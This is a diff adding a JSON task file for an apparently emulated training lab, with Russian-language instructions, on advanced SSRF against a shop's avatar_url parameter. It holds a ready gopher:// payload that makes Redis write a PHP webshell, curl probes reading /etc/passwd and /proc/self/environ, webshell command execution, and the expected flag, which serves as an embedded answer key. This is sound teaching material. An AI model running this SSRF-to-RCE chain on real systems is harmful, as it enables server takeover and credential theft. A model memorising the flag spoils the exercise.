@@ -1,0 +1,28 @@
+{
+  "id": "web-ssrf-advanced",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{ssrf_g0ph3r_r3d1s_t0_rce}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: продвинутый SSRF — gopher → Redis → RCE\n\nТот же параметр `avatar_url`, но теперь цель — **схема** и внутренний TCP.\n`file://` отклонён, а `gopher://` проходит: им можно передать сырые байты\nв Redis (6379) и записать webshell в веб-каталог.\n\n1. Проверяем схемы:\n\n   curl -s -d 'avatar_url=file:///etc/passwd' https://shop.local/profile/avatar\n   curl -s -d 'avatar_url=gopher://127.0.0.1:6379/_PING' https://shop.local/profile/avatar\n   curl -s -d 'avatar_url=dict://127.0.0.1:6379/INFO' https://shop.local/profile/avatar\n\n2. В каталоге лежит `gopher.txt` — gopher-payload для Redis (flushall + запись\n   PHP-шелла через dir/dbfilename). Отправляем его:\n\n   curl -s --data-urlencode 'avatar_url@gopher.txt' https://shop.local/profile/avatar\n\n3. Redis записал `shell.php` в веб-каталог. Выполняем команду и читаем флаг:\n\n   curl -s 'https://shop.local/shell.php?cmd=id'\n   curl -s 'https://shop.local/shell.php?cmd=cat /flag.txt' > found.txt\n\n4. Набери `check`.\n" },
+    { "path": "/home/student/task/gopher.txt", "text": "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%24PAYLOAD%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%248%0D%0Asave%0D%0A\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "shell\\.php.*flag|flag\\.txt.*shell", "example": "-s 'https://shop.local/shell.php?cmd=cat /flag.txt'", "output": "nto{ssrf_g0ph3r_r3d1s_t0_rce}\n" },
+        { "match": "shell\\.php", "example": "-s 'https://shop.local/shell.php?cmd=id'", "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n" },
+        { "match": "gopher\\.txt|avatar_url@gopher", "example": "--data-urlencode 'avatar_url@gopher.txt' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"+OK\"}\n" },
+        { "match": "flushall|gopher://127\\.0\\.0\\.1:6379/_%2A", "example": "-d 'avatar_url=gopher://127.0.0.1:6379/_<redis-payload>' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"+OK\"}\n" },
+        { "match": "gopher://127\\.0\\.0\\.1:6379/_PING|gopher.*PING", "example": "-d 'avatar_url=gopher://127.0.0.1:6379/_PING' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"PONG\"}\n" },
+        { "match": "dict://", "example": "-d 'avatar_url=dict://127.0.0.1:6379/INFO' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"# Server\\nredis_version:6.0.9\\n\"}\n" },
+        { "match": "file://", "example": "-d 'avatar_url=file:///etc/passwd' https://shop.local/profile/avatar", "output": "{\"error\":\"unsupported_scheme\"}\n" },
+        { "match": "/proc/self/environ", "example": "-d 'avatar_url=file:///proc/self/environ' https://func.shop.local/fetch", "output": "{\"status\":\"ok\",\"saved\":\"AWS_LAMBDA_FUNCTION_NAME=fetch\\nDB_PASSWORD=...\"}\n" },
+        { "match": "rebind|our-domain", "example": "-d 'avatar_url=http://rebind.our-domain.com/' https://shop.local/profile/avatar", "output": "{\"status\":\"ok\",\"saved\":\"internal\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется загрузчик аватара и webshell на shop.local.\n"
+    }
+  }
+}
